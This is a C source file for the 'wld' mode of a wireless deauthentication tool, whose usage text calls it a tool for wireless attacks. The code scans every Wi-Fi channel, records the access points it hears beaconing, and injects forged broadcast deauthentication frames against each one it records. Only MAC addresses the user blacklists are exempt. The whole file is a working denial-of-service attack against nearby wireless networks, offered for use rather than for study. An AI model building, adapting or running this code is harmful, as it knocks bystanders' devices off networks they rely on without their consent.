


/*!

	@file deauth_wld.c

	@brief Deauth method with unconditioned access point
	deauthentication.

	Probes from nearby accesspoints will be collected and
	targeted for deauthentication. Every channel will be
	searched unless specified otherwise.

	The static functions declared here will be assigned to
	the deauth_method struct passed to deauth_wld_register
	if called from deauth_register in deauth.c.

	@see deauth.c

	TODO:
		-
		-
		-

*/



#ifdef DEAUTH_METHOD_WLD

#ifndef DEAUTH_WLD_C
#define DEAUTH_WLD_C



#include <time.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/time.h>

#include "deauth.h"
#include "arg_parse.h"
#include "raw_socket.h"
#include "set_channel.h"
#include "hostapd_common.h"
#include "ieee802_11_defs.h"
#include "hostapd_includes.h"
#include "accesspoint_list.h"
#include "wiredeauth_debug.h"
#include "ieee802_11_common.h"



//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////

static int shortarg_foreach(char opt, char *val, void *cb_data);
static int longarg_foreach(char *opt, char *val, void *cb_data);
static int is_blacklisted(struct macaddr *blacklisted, u8 *bssid);
static int increment_bssid_beacons(struct accesspoint *ap, void *bssid);
static int get_usec_time(void);
static int cycle_channel(struct deauth_ctx *ctx);
static void forge_radiotap(u8 *pkt, int *pkt_len);
static int deauth_bssid(struct deauth_ctx *ctx, u8 *bssid);
static int accesspoint_deauth_cb(struct accesspoint *ap, void *cb_data);

//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////

static struct deauth_ctx *_ctx_new(void);
static int _config(struct deauth_ctx *ctx, int argc, char **argv);
static int _init(struct deauth_ctx *ctx);
static int _gather_aps(struct deauth_ctx *ctx);
static int _deauth_aps(struct deauth_ctx *ctx);
static void __exit(struct deauth_ctx *ctx);
static void _ctx_destroy(struct deauth_ctx *ctx);

/*!

	@brief Register an deauth_method with the defined
	static functions.

	Registers the given deauth_method pointer with the
	defined static functions for wld deauthentication.
	deauth_method_register() will call this function to
	register the deauth_method if DEAUTH_METHOD_WLD is
	defined for compilation.

	@see deauth_method_register

	@param method Pointer to an empty deauth_method
	struct.

	@return 0 on success, -1 on failure

*/
int deauth_wld_register(struct deauth_method *method) {

	method->ctx_new = _ctx_new;
	method->config = _config;
	method->init = _init;
	method->gather_aps = _gather_aps;
	method->deauth_aps = _deauth_aps;
	method->exit = __exit;
	method->ctx_destroy = _ctx_destroy;

	return 0;

}

//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////

/// String for the module name
#define DEAUTH_STR_WLD "wld"

/// Usage to display on faulty argument or '--help'
#define USAGE_STR_WLD											\
	"\n" HOST_NAME " " PROG_NAME " (Release " PROG_VER")\n"						\
	"Deauthentication tool for wireless attacks.\n\n"						\
	"Usage (" DEAUTH_STR_WLD " mode): " PROG_NAME "\n\n"						\
	"    -n, --n-deauth=N                     Send N deauthentication packets for every\n"		\
	"                                         targeted access point\n\n"				\
	"    -i, --interface=NAME                 Use network interface NAME\n\n"			\
	"    -c, --channels=C1,C2...Ck            Only inject on channels C1, C2... Ck\n\n"		\
	"    -b, --blacklist=MAC1,MAC2...MACk     Do not deauthenticate routers with MAC\n"		\
	"                                         addresses MAC1, MAC2... MACk\n\n"			\
	"    -p, --probe-rate=N                   Cycle the channel after every N probes\n\n"		\
	"    --max-probe-addrs=N                  Do not record more than N addrs per probe\n\n"	\
	"    --max-probe-time=T                   Do not probe for more than T seconds\n\n"		\

/// Assigned to method->ctx_new on registration
static struct deauth_ctx *_ctx_new(void) {

	int channel;
	struct deauth_ctx *ctx;

	ctx = (struct deauth_ctx*)malloc(sizeof(struct deauth_ctx));
	if ( !ctx ) {
		PRINTF("deauth_" DEAUTH_STR_WLD "::new(): Failed allocation.\n");
		return NULL;
	}

	// Defaults here
	ctx->n_deauth_rounds = 64;
	ctx->if_name = NULL;
	ctx->sock_fd = -1;
	CHANNELS_FOREACH(
		ctx->target_aps[chan_index] = NULL;
		ctx->allowed_channels[chan_index] = 0; // Not allowed
	);
	ctx->n_allowed_channels = 0;
	ctx->probes_per_channel = 3;
	ctx->probe_addr_limit = 64;
	ctx->probe_time_limit = 20;
	ctx->probe_busy = 0;
	ctx->mac_blacklist = NULL;

	return ctx;

}

/// Assigned to method->config on registration
static int _config(struct deauth_ctx *ctx, int argc, char **argv) {

	if ( parse_args(argc, argv, shortarg_foreach, longarg_foreach, ctx, USAGE_STR_WLD) < 0 )
		return -1;

	if ( !ctx->probe_addr_limit && !ctx->probe_time_limit ) {
		PRINTF("Probing must be limited by address count or time.\n");
		return -1;
	}

	if ( ctx->channels_specified )
		return 0;

	/*
		Default to all channels allowed since
		none were specified
	*/
	CHANNELS_FOREACH(

		ctx->target_aps[chan_index] = accesspoint_list_new();

		if ( !ctx->target_aps[chan_index] ) {
			PRINTF("List creation failed for channel %d.\n", channel);
			return -1;
		}

		ctx->allowed_channels[chan_index] = 1;
		ctx->n_allowed_channels += 1;

	);

	return 0;

}

/// Assigned to method->init on registration
static int _init(struct deauth_ctx *ctx) {

	if ( !ctx->if_name ) {
		PRINTF("deauth_" DEAUTH_STR_WLD "::init(): No interface specified.\n");
		return -1;
	}

	if ( (ctx->sock_fd = rawsock_new(ctx->if_name, ETH_P_ALL)) < 0 )
		return -1;

	// Initialize to first allowed channel
	CHANNELS_FOREACH(
		if ( ctx->allowed_channels[chan_index] ) {
			ctx->current_channel = channel;
			break;
		}
	);

	set_channel(ctx->if_name, ctx->current_channel);

	ctx->channel_probes_remaining = ctx->probes_per_channel;

	PRINTF("Started " DEAUTH_STR_WLD " mode.\n");

	return 0;

}

/// Assigned to method->gather_aps on registration
static int _gather_aps(struct deauth_ctx *ctx) {

	int n_beacons_recorded = 0;
	struct accesspoint_list *target_list;
	le16 beacon_fc = IEEE80211_FC(WLAN_FC_TYPE_MGMT, WLAN_FC_STYPE_BEACON);

	// Change the channel if expired
	if ( !ctx->channel_probes_remaining ) {
		cycle_channel(ctx);
		ctx->channel_probes_remaining = ctx->probes_per_channel;
	}

	ctx->channel_probes_remaining -= 1;

	PRINTF("deauth_" DEAUTH_STR_WLD "::gather_aps():"
		" Probing on channel %d.\n", ctx->current_channel);

	/* Target list to store access point info */
	target_list = ctx->target_aps[ctx->current_channel - 1];
	if ( !target_list ) {
		PRINTF("Attempted to access NULL target list on channel %d.\n", ctx->current_channel);
		return -1;
	}

	ctx->probe_busy = 1;

	ctx->probe_expiry_time = get_usec_time() + ctx->probe_time_limit*1000000;

	PRINTF("Collecting beacons: ");
	fflush(stdout);

	while ( 1 ) {

		unsigned char pkt_buf[PKT_MAXSZ];
		size_t payload_len, rtap_hdrlen;
		int n_accesspoints_updated, usecs_remaining, pkt_len;

		struct ieee80211_mgmt *mgmt;
		struct ieee802_11_elems elems;

		struct accesspoint *new_record;

		/* Check if beacon limits are reached */
		if ( ctx->probe_addr_limit && n_beacons_recorded >= ctx->probe_addr_limit )
			break;

		/* Check if time limits are reached */
		usecs_remaining = ctx->probe_expiry_time - get_usec_time();
		if ( ctx->probe_time_limit && usecs_remaining <= 0 )
			break;

		/* Receive packet */
		pkt_len = rawsock_recv(ctx->sock_fd, pkt_buf, usecs_remaining);
		if ( pkt_len < 0 ) {
			ctx->probe_busy = 0;
			PRINTF("Socket failure, exiting...\n");
			return -1;
		} else if ( pkt_len == 0 )
			/* Timeout */
			continue;

		/* Get radiotap header length */
		rtap_hdrlen = RTAP_HDRLEN(pkt_buf);

		/* Get IEEE 802.11 management header and check if it's a beacon */
		mgmt = (struct ieee80211_mgmt*)(pkt_buf + rtap_hdrlen);
		if ( mgmt->frame_control != beacon_fc )
			continue;

		/* Check if blacklisted */
		if ( is_blacklisted(ctx->mac_blacklist, mgmt->bssid) )
			continue;

		/* Get payload length and parse information elements */
		payload_len = pkt_len - (rtap_hdrlen + IEEE80211_HDRLEN + sizeof(mgmt->u.beacon));
		if ( ieee802_11_parse_elems(mgmt->u.beacon.variable, payload_len, &elems, 0) == ParseFailed ) {
			PRINTF("deauth_" DEAUTH_STR_WLD "::gather_aps(): Beacon parsing error.\n");
			continue;
		}

		PRINTF("+");
		fflush(stdout);

		/*
		 * Increment the beacon capture count of the BSSID in the
		 * received management frame. If found then do not proceed
		 * to make a new list node.
		 */
		n_accesspoints_updated =
			accesspoint_list_foreach(target_list, increment_bssid_beacons, mgmt->bssid);
		if ( n_accesspoints_updated > 0 ) {
			/*
			 * Do not increment if we're only interested
			 * in the number of distinct BSSID's.
			 */
			++n_beacons_recorded;
			continue;
		}

		/* Create new record */
		if ( !(new_record = accesspoint_alloc()) ) {
			PRINTF("Probe record allocation failure.\n");
			return -1;
		}
		memcpy(new_record->ap_mac, mgmt->bssid, 6);
		new_record->channel = ctx->current_channel;
		new_record->ssid = strndup(elems.ssid, elems.ssid_len);
		new_record->location = strndup(elems.cisco_name, elems.cisco_name_len);
		new_record->n_beacons_captured = 1;

		accesspoint_list_insert(target_list, new_record);

		++n_beacons_recorded;

	}

	PRINTF("\nLimit exceeded; recorded %d/%d beacons.\n\n",
		n_beacons_recorded, ctx->probe_addr_limit);

	ctx->probe_busy = 0;

	return 0;

}

/// Assigned to method->deauth_aps on registration
static int _deauth_aps(struct deauth_ctx *ctx) {

	int n_deauth_failures;
	struct accesspoint_list *target_list;

	target_list = ctx->target_aps[ctx->current_channel - 1];
	n_deauth_failures =
		accesspoint_list_foreach(target_list, accesspoint_deauth_cb, ctx);

	if ( n_deauth_failures > 0 )
		return -1;

	return 0;

}

/// Assigned to method->exit on registration
static void __exit(struct deauth_ctx *ctx) {

	if ( !(ctx->sock_fd < 0) ) {
		close(ctx->sock_fd);
		ctx->sock_fd = -1;
	}

	return;

}

/// Assigned to method->_ctx_destroy on registration
static void _ctx_destroy(struct deauth_ctx *ctx) {

	struct macaddr *mac;

	if ( ctx->if_name )
		free(ctx->if_name);

	mac = ctx->mac_blacklist;
	while ( mac ) {
		struct macaddr *next = mac->next;
		free(mac);
		mac = next;
	}

	CHANNELS_FOREACH(
		if ( !ctx->target_aps[chan_index] ) continue;
		accesspoint_list_free(ctx->target_aps[chan_index]);
	);

	free(ctx);

	return;

}

//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////

/// Determine if two strings are equal
#define STREQ(x,y) (!strcmp(x,y))

/*!

	@brief Argument parser callback for short (single character)
	arguments (see arg_parser.c)

	@param opt Option character
	@param val String representation of the argument value
	@param cb_data Callback data (allocated deauth_ctx casted to void in this case)

	@return 0 on success, -1 on failure

*/
static int shortarg_foreach(char opt, char *val, void *cb_data) {

	struct deauth_ctx *ctx = (struct deauth_ctx*)cb_data;

	if ( opt == 'n' ) {

		int n = atoi(val);

		if ( n <= 0 ) {
			PRINTF("Bad number %d for deauth rounds.\n", n);
			return -1;
		}

		if ( n > MAX_SEQNUM ) {
			PRINTF("Deauth rounds cannot exceed %d.\n", MAX_SEQNUM);
			return -1;
		}

		ctx->n_deauth_rounds = n;

		return 0;

	} else if ( opt == 'i' ) {

		ctx->if_name = strdup(val);

		return 0;

	} else if ( opt == 'c' ) {

		int chan_index = atoi(val) - 1;

		if ( chan_index >= N_CHANNELS || chan_index < 0 ) {
			PRINTF("Bad channel %d was specified.\n", chan_index+1);
			return -1;
		}

		if ( ctx->allowed_channels[chan_index] ) { // Already allowed
			PRINTF("Warning: Channel %d was already allowed.\n", chan_index+1);
			return 0;
		}

		ctx->target_aps[chan_index] = accesspoint_list_new();

		if ( !ctx->target_aps[chan_index] ) {
			PRINTF("List creation failed for channel %d.\n", chan_index+1);
			return -1;
		}

		ctx->allowed_channels[chan_index] = 1; // Allow
		ctx->n_allowed_channels += 1;

		return 0;

	} else if ( opt == 'b' ) {

		struct macaddr *new_head =
			(struct macaddr*)malloc(sizeof(struct macaddr));

		unsigned mac[6];

		int n = sscanf(val, "%02x:%02x:%02x:%02x:%02x:%02x",
			&(mac[0]), &(mac[1]), &(mac[2]), &(mac[3]), &(mac[4]), &(mac[5])
		);

		new_head->mac[0] = (u8)mac[0];
		new_head->mac[1] = (u8)mac[1];
		new_head->mac[2] = (u8)mac[2];
		new_head->mac[3] = (u8)mac[3];
		new_head->mac[4] = (u8)mac[4];
		new_head->mac[5] = (u8)mac[5];

		if ( n != 6 ) {
			PRINTF("Invalid MAC address %s...\n", val);
			free(new_head);
			return -1;
		}

		// Push
		new_head->next = ctx->mac_blacklist;
		ctx->mac_blacklist = new_head;

		return 0;

	} else if ( opt == 'p' ) {

		int n = atoi(val);

		if ( n <= 0 ) {
			PRINTF("Bad probe rate %d.\n", n);
			return -1;
		}

		ctx->probes_per_channel = n;

		return 0;

	}

	if ( opt != 'h' )
		PRINTF("Unrecognized option %c.\n", opt);

	return -1;

}

/*!

	@brief Argument parser callback for long (multi-character)
	arguments (see arg_parser.c)

	@param opt Option string
	@param val String representation of the argument value
	@param cb_data Callback data (allocated deauth_ctx casted to void in this case)

	@return 0 on success, -1 on failure

*/
static int longarg_foreach(char *opt, char *val, void *cb_data) {

	struct deauth_ctx *ctx = (struct deauth_ctx*)cb_data;

	if ( STREQ(opt, "n-deauth") ) {

		int n = atoi(val);

		if ( n <= 0 ) {
			PRINTF("Bad number %d for deauth rounds.\n", n);
			return -1;
		}

		if ( n > MAX_SEQNUM ) {
			PRINTF("Deauth rounds cannot exceed %d.\n", MAX_SEQNUM);
			return -1;
		}

		ctx->n_deauth_rounds = n;

		return 0;

	} else if ( STREQ(opt, "interface") ) {

		ctx->if_name = strdup(val);

		return 0;

	} else if ( STREQ(opt, "channels") ) {

		int chan_index = atoi(val) - 1;

		if ( chan_index >= N_CHANNELS || chan_index < 0 ) {
			PRINTF("Bad channel %d was specified.\n", chan_index+1);
			return -1;
		}

		if ( ctx->allowed_channels[chan_index] ) { // Already allowed
			PRINTF("Warning: Channel %d was already allowed.\n", chan_index+1);
			return 0;
		}

		ctx->target_aps[chan_index] = accesspoint_list_new();

		if ( !ctx->target_aps[chan_index] ) {
			PRINTF("List creation failed for channel %d.\n", chan_index+1);
			return -1;
		}

		ctx->allowed_channels[chan_index] = 1; // Allow
		ctx->n_allowed_channels += 1;

		return 0;

	} else if ( STREQ(opt, "blacklist") ) {

		struct macaddr *new_head =
			(struct macaddr*)malloc(sizeof(struct macaddr));

		unsigned mac[6];

		int n = sscanf(val, "%02x:%02x:%02x:%02x:%02x:%02x",
			&(mac[0]), &(mac[1]), &(mac[2]), &(mac[3]), &(mac[4]), &(mac[5])
		);

		new_head->mac[0] = (u8)mac[0];
		new_head->mac[1] = (u8)mac[1];
		new_head->mac[2] = (u8)mac[2];
		new_head->mac[3] = (u8)mac[3];
		new_head->mac[4] = (u8)mac[4];
		new_head->mac[5] = (u8)mac[5];

		if ( n != 6 ) {
			PRINTF("Invalid MAC address %s...\n", val);
			free(new_head);
			return -1;
		}

		// Push
		new_head->next = ctx->mac_blacklist;
		ctx->mac_blacklist = new_head;

		return 0;

	} else if ( STREQ(opt, "probe-rate") ) {

		int n = atoi(val);

		if ( n <= 0 ) {
			PRINTF("Bad probe rate %d.\n", n);
			return -1;
		}

		ctx->probes_per_channel = n;

		return 0;

	} else if ( STREQ(opt, "max-probe-addrs") ) {

		int n = atoi(val);

		if ( n < 0 ) {
			PRINTF("Bad limit %d for probe addresses.\n", n);
			return -1;
		}

		ctx->probe_addr_limit = n;

		return 0;

	} else if ( STREQ(opt, "max-probe-time") ) {

		int n = atoi(val);

		if ( n < 0 ) {
			PRINTF("Bad limit %d for probe time.\n", n);
			return -1;
		}

		ctx->probe_time_limit = n;

		return 0;

	}

	if ( !STREQ(opt, "help") )
		PRINTF("Unrecognized option %s.\n", opt);

	return -1;

}

#undef STREQ

//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////

/*!

	@brief Tell if a given BSSID is blacklisted.

	@param blacklisted Pointer to the head of a BSSID blacklist.
	@param bssid BSSID to check.

	@see macaddr

	@return 1 if the BSSID is blacklisted, 0 otherwise.

*/
static int is_blacklisted(struct macaddr *blacklisted, u8 *bssid) {

	while ( blacklisted ) {
		if ( memcmp(blacklisted->mac, bssid, 6) == 0 )
			return 1;
		blacklisted = blacklisted->next;
	}

	return 0;

}

/*!

	@brief Indicator function to increment the beacon capture
	count of an accesspoint_list node with a given BSSID.

	Passed as a callback function to accesspoint_list_foreach
	as an alternative to duplicating BSSID's in the list.

	@param ap accesspoint node in the list.
	@param bssid Pointer to 6-octet bssid.

	@see accesspoint.h

	@return 1 indicating the given BSSID matched, 0 otherwise.

*/
static int increment_bssid_beacons(struct accesspoint *ap, void *bssid) {

	if ( memcmp(ap->ap_mac, bssid, 6) == 0 ) {
		ap->n_beacons_captured += 1;
		return 1;
	}

	return 0;

}

/*!

	@brief Get the number of milliseconds since the epoch.

*/
static int get_usec_time(void) {

	struct timeval tv;

	gettimeofday(&tv, NULL);

	return tv.tv_usec + 1000000*tv.tv_sec;

}

/*!

	@brief Move to the next allowed channel.

	@return 0 on success, -1 on failure.

*/
static int cycle_channel(struct deauth_ctx *ctx) {

	int old_channel = ctx->current_channel;

	PRINTF("Switching from channel %d.\n", old_channel);

	CHANNELS_CYCLE(old_channel,
		if ( ctx->allowed_channels[chan_index] ) {
			ctx->current_channel = channel;
			break;
		}
	);

	PRINTF("New channel: %d\n", ctx->current_channel);

	if ( ctx->current_channel != old_channel )
		set_channel(ctx->if_name, ctx->current_channel);

	return 0;

}

/*!

	@brief Deauthenticate stations from a bssid given a
	configuration context.

	@param ctx Context containing the deauthentication
	configuration
	@param bssid BSSID of the access point to target

	@returns 0 on success, -1 on socket failure

*/
static int deauth_bssid(struct deauth_ctx *ctx, u8 *bssid) {

	int pkt_len, mgmt_len, rtap_hdrlen, deauth_round;
	u8 pkt[PKT_MAXSZ];
	struct ieee80211_mgmt *mgmt;

	forge_radiotap(pkt, &rtap_hdrlen);
	mgmt = (struct ieee80211_mgmt*)(pkt + rtap_hdrlen);
	forge_broadcast_deauth(bssid, mgmt, &mgmt_len);
	pkt_len = rtap_hdrlen + mgmt_len;

	PRINTF("Injecting deauthentication frames for "
		"BSSID %02x:%02x:%02x:%02x:%02x:%02x (%d rounds): ",
		bssid[0], bssid[1], bssid[2], bssid[3], bssid[4],
		bssid[5], ctx->n_deauth_rounds);
	fflush(stdout);

	for (deauth_round = 0; deauth_round < ctx->n_deauth_rounds; deauth_round++) {

		char le_seq_id[2];

		le_seq_id[0] = (char)((deauth_round*16)%256);
		le_seq_id[1] = (char)((deauth_round/16)%256);

		memcpy(&(mgmt->seq_ctrl), le_seq_id, 2);

		if ( rawsock_send(ctx->sock_fd, pkt, pkt_len) < 0 )
			return -1;

		PRINTF(">");
		fflush(stdout);

	}

	PRINTF("\n");

	return 0;

}

/*!

	@brief Write a valid radiotap header on a packet.

	XXX:
		- This was taken from an old code. It is not
		confirmed that this header will always work.

	@param packet Start of packet buffer to write at.
	@param pkt_len Pointer to integer to write the length
	of the forged header.

*/
static void forge_radiotap(u8 *pkt, int *pkt_len) {

	memcpy(pkt, "\x00\x00\x0C\x00\x04\x80\x00\x00\x02\x00\x18\x00", 12);
	*pkt_len = 12;

	return;

}

/*!

	@brief Indicator function to deauthenticate an
	accesspoint_list node with a given BSSID.

	Passed as a callback function to accesspoint_list_foreach.
	On deauthentication error this will return 1 and otherwise
	return 0 so that accesspoint_list_foreach() returns the
	number of deauth failures.

	@param ap accesspoint node in the list.
	@param cb_data Pointer to deauth context.

	@see accesspoint.h

	@return 0 indicating all deauthentication packets were sent,
	1 otherwise.

*/
static int accesspoint_deauth_cb(struct accesspoint *ap, void *cb_data) {

	/* 0 on success, 1 on failure */
	return -(deauth_bssid((struct deauth_ctx*)cb_data, ap->ap_mac));

}

//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////



#endif /* DEAUTH_WLD_C */

#endif /* DEAUTH_METHOD_WLD */



